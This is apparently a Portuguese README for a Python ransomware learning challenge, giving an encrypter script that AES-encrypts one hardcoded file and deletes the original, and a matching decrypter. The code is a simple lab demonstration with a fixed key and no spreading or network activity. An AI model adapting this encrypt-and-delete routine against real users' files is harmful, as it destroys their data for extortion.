# Desafio de Ransomware com Python

## Ferramentas Utilizadas
- **Python 3**
- **Biblioteca pyaes** (para AES simétrico)
- **Kali Linux** (ou qualquer distribuição Linux)

## Instalação
Antes de executar o código, instale a biblioteca necessária:
```bash
pip3 install pyaes
```

## Encriptando o Arquivo
### Código `encrypter.py`
```python
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "Desafio.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomware"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```

## Decriptando o Arquivo
### Código `decrypter.py`
```python
import os
import pyaes

## abrir o arquivo criptografado
file_name = "Desafio.txt.ransomware"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "Desafio.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```

## Executando o Projeto
![image](https://github.com/user-attachments/assets/772d889a-d027-4d10-91ca-958eae2f7c55)


---

